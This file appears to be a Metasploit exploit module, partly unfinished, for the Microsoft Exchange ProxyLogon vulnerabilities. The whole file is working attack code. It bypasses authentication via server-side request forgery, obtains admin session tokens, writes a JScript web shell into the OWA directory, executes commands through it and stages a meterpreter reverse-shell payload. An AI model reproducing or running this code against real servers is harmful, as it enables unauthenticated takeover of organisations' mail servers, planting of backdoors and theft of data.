##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::CheckModule
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'                => 'Microsoft Exchange ProxyLogon RCE',
      'Description'         => %q{
        This module scan for a vulnerability on Microsoft Exchange Server that
        allows an attacker bypassing the authentication and impersonating as the
        admin (CVE-2021-26855).

        By chaining this bug with another post-auth arbitrary-file-write
        vulnerability to get code execution (CVE-2021-27065).

        As a result, an unauthenticated attacker can execute arbitrary commands on
        Microsoft Exchange Server.

        This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,
        Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,
        Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

        All components are vulnerable by default.
      },
      'Author'              => [
        'mekhalleh (RAMELLA Sébastien)', # Module author (Zeop Entreprise)
        'DEWOLF Francois'                # Zeop Entreprise
      ],
      'References'          => [
        ['CVE', '2021-26855'],
        ['CVE', '2021-27065']
      ],
      'DisclosureDate'      => '2021-03-02',
      'License'             => MSF_LICENSE,
      'DefaultOptions'      => {
        'CheckModule'       => 'auxiliary/scanner/http/exchange_proxylogon',
        'HttpClientTimeout' => 3.5,
        'RPORT' => 443,
        'SSL' => true,
        'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
        'CmdStagerFlavor' => 'psh_invokewebrequest'
      },
      'Platform'            => ['windows'],
        'Arch'                => [ARCH_X64],
        'Privileged'          => true,
      'Targets'             => [
        ['Automatic', {}],
      ],
      'DefaultTarget'       => 0,
      'Notes'               => {
        'AKA'               => ['ProxyLogon']
      }
    ))

    register_options([
      OptString.new('EMAIL', [true, 'TODO']),
      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check.', 'POST', ['GET', 'POST']])
    ])

    register_advanced_options([
      OptBool.new('ForceExploit', [false, 'Override check result', false]),
      OptString.new('MapiClientApp', [true, 'TODO', 'Outlook/15.0.4815.1002']),
      OptString.new('UserAgent', [true, 'TODO', 'Mozilla/5.0'])
    ])
  end



  def execute_command(cmd, _opts = {})
    
    cmd = "Response.Write(new ActiveXObject(\"WScript.Shell\").Exec(\"cmd /c #{cmd.gsub('"', "\"")}\").StdOut.ReadAll());"
    print_good(cmd)
    response = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri('/owa/auth/todo.aspx'),
      'vars_post' => {
        'cmd' => "#{cmd}"
      }
    )

  end



  def install_payload(server_name, sid, canary, oab_id)
    shell = 'http://o/#<script language="JScript" runat="server">function Page_Load(){eval(Request["cmd"],"unsafe");}</script>'
    data = {
      "identity": {
        "__type": "Identity:ECP",
        "DisplayName": "#{oab_id[0]}",
        "RawIdentity": "#{oab_id[1]}"
      },
      "properties": {
        "Parameters": {
          "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
          "ExternalUrl": "#{shell}"
        }
      }
    }.to_json

    response = send_http(
      'POST',
      "Admin@#{server_name}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=#{canary}&a=~1942062522",
      data,
      'application/json; charset=utf-8',
      { 'msExchLogonMailbox' => sid }
    )
    # TODO: add more check.
    return false if response.code != 200

    true
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def request_autodiscover(server_name)
    xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }

    response = send_xml(soap_autodiscover, "#{server_name}/autodiscover/autodiscover.xml?a=~1942062522")
    xml = Nokogiri::XML.parse(response.body)

    legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns).content
    fail_with(Failure::Unknown, 'The `LegacyDN` value could not be found') if legacy_dn.empty?

    server = ''
    owa_urls = []
    xml.xpath("//xmlns:Account/xmlns:Protocol", xmlns).each do|item|
      type = item.at_xpath('./xmlns:Type', xmlns).content
      if type == 'EXCH'
        server = item.at_xpath("./xmlns:Server", xmlns).content
      end

      if type == 'WEB'
        item.xpath("./xmlns:Internal/xmlns:OWAUrl", xmlns).each do|owa_url|
          owa_urls << owa_url.content
        end
      end
    end
    fail_with(Failure::Unknown, 'No `OWAUrl` was found') unless owa_urls.length > 0

    return([server, legacy_dn, owa_urls])
  end

  def request_mapi(server_name, legacy_dn, server_id)
    mapi_data = "#{legacy_dn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

    sid = ''
    response = send_mapi(mapi_data, "Admin@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~1942062522")
    if response.code == 200 && response.body =~ /act as owner of a UserMailbox/
      sid_regex = /S-[0-9]{1}-[0-9]{1}-[0-9]{2}-[0-9]{10}-[0-9]{9}-[0-9]{10}-[0-9]{3,4}/
      sid = response.body.match(sid_regex)
    end
    fail_with(Failure::Unknown, 'No `SID` was found') if sid.to_s.empty?
    
    sid
  end

  def request_oab(server_name, sid, canary)
    data = {
      "filter": {
        "Parameters": {
          "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
          "SelectedView": "",
          "SelectedVDirType": "OAB"
        }
      },
      "sort": {}
    }.to_json

    response = send_http(
      'POST',
      "Admin@#{server_name}:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&schema=VirtualDirectory&msExchEcpCanary=#{canary}&a=~1942062522",
      data,
      'application/json; charset=utf-8',
      { 'msExchLogonMailbox' => sid }
    )

    if response.code == 200
      data = JSON.parse(response.body)
      data['d']['Output'].each do |oab|
        if oab['Server'].downcase == server_name.downcase
          return [oab['Identity']['DisplayName'], oab['Identity']['RawIdentity']]
        end
      end
    end

    fail_with(Failure::Unknown, 'No `OAB Id` was found')
  end

  def write_payload(server_name, sid, canary, oab_id)
    shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\todo.aspx"
    shell_path = "\\\\127.0.0.1\\c$\\#{shell_path}"

    data = {
      "identity": {
        "__type": "Identity:ECP",
        "DisplayName": "#{oab_id[0]}",
        "RawIdentity": "#{oab_id[1]}"
      },
      "properties": {
        "Parameters": {
          "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
          "FilePathName": "#{shell_path}"
        }
      }
    }.to_json

    response = send_http(
      'POST',
      "Admin@#{server_name}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=#{canary}&a=~1942062522",
      data,
      'application/json; charset=utf-8',
      { 'msExchLogonMailbox' => sid }
    )
    #TODO
  end

  def resqest_proxylogon(server_name, sid)
    headers = { 'msExchLogonMailbox' => sid }
    data = "<r at=\"Negotiate\" ln=\"#{rand_text_alpha(4..8)}\"><s>#{sid}</s></r>"

    response = send_xml(data, "Admin@#{server_name}:444/ecp/proxyLogon.ecp?a=~1942062522", headers)
    if response.code == 241
        session_id = response.get_cookies.scan(/ASP\.NET_SessionId=([\w\-]+);/).flatten[0]
        canary = response.get_cookies.scan(/msExchEcpCanary=([\w\-\_\.]+);*/).flatten[0] # coin coin coin ...
    end
    fail_with(Failure::Unknown, 'Could\'t get the \'ASP.NET_SessionId\' from the headers response') if session_id.empty?
    fail_with(Failure::Unknown, 'Could\'t get the \'msExchEcpCanary\' from the headers response') if canary.empty?

    return([session_id, canary])
  end

  def send_http(method, ssrf, data = '', ctype = 'application/x-www-form-urlencoded', headers = '')
    cookie = "X-BEResource=#{ssrf};"
    if @session
      cookie = "X-BEResource=#{ssrf}; #{@session}"
    end

    request = {
      'method' => method,
      'uri' => @random_uri,
      'agent' => datastore['UserAgent'],
      'cookie' => cookie,
      'ctype' => ctype
    }
    request = request.merge('headers' => headers) unless headers.empty?
    request = request.merge({'data' => data}) unless data.empty?

    received = send_request_cgi(request)
    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received

    received
  end

  def send_mapi(data, ssrf)
    request = {
      'method' => 'POST',
      'uri' => @random_uri,
      'agent' => datastore['UserAgent'],
      'cookie' => "X-BEResource=#{ssrf};",
      'ctype' => 'application/mapi-http',
      'headers' => {
        'X-Requesttype' => 'Connect',
        'X-Requestid' => "#{Rex::Text.rand_text_numeric(12..13)}",
        'X-Clientapplication' => datastore['MapiClientApp']
      },
      'data' => data
    }

    received = send_request_cgi(request)
    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received

    received
  end

  def send_xml(data, ssrf, headers = '')
    request = {
      'method' => 'POST',
      'uri' => @random_uri,
      'agent' => datastore['UserAgent'],
      'cookie' => "X-BEResource=#{ssrf};",
      'ctype' => 'text/xml; charset=utf-8'
    }
    request = request.merge('headers' => headers) unless headers.empty?
    request = request.merge({'data' => data})

    received = send_request_cgi(request)
    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received

    received
  end

  def soap_autodiscover
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>#{datastore['EMAIL']}</EMailAddress>
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
      </Autodiscover>
    SOAP
  end

  def exploit
    unless datastore['ForceExploit']
      case check
      when CheckCode::Vulnerable
        print_good('The target appears to be vulnerable')
      when CheckCode::Safe
        fail_with(Failure::NotVulnerable, 'The target does not appear to be vulnerable')
      else
        fail_with(Failure::Unknown, 'The target vulnerability state is unknown')
      end
    end

    @proto = (ssl ? 'https' : 'http')
    @random_uri = normalize_uri('ecp', "#{rand_text_alpha(1..3)}.js")

    print_status(message('Attempt to exploit for CVE-2021-26855'))

    # request for internal server name.
    response = send_http(datastore['METHOD'], 'localhost~1942062522')
    if response.code != 500 || response.headers['X-FEServer'].empty?
      print_bad('Could\'t get the \'X-FEServer\' from the headers response.')

      return
    end
    server_name = response.headers['X-FEServer']
    print_status(" * internal server name (#{server_name})")

    # get informations by autodiscover request.
    print_status(message('Sending autodiscover request'))
    discover_info = request_autodiscover(server_name)
    server_id = discover_info[0]
    legacy_dn = discover_info[1]

    print_status(" * Server: #{server_id}")
    print_status(" * LegacyDN: #{legacy_dn}")

    # get the user UID using mapi request.
    print_status(message('Sending mapi request'))
    sid = request_mapi(server_name, legacy_dn, server_id)
    print_status(" * sid: #{sid} (#{datastore['EMAIL']})")

    # request cookies (session and canary)
    print_status(message('Sending ProxyLogon request'))
    session_info = resqest_proxylogon(server_name, sid)

    print_status(" * ASP.NET_SessionId: #{session_info[0]}")
    print_status(" * msExchEcpCanary: #{session_info[1]}")
    @session = "ASP.NET_SessionId=#{session_info[0]}; msExchEcpCanary=#{session_info[1]};"

    # get OAB id
    oab_id = request_oab(server_name, sid, session_info[1])
    print_status(" * OAB id: #{oab_id[1]} (#{oab_id[0]})")

    # set external url (and set the payload).
    install_payload(server_name, sid, session_info[1], oab_id)

    # reset the virtual directory (and write the payload).
    write_payload(server_name, sid, session_info[1], oab_id)

    # trigger powa!
    stager = generate_cmdstager().join()
    execute_command(stager)








  end

end
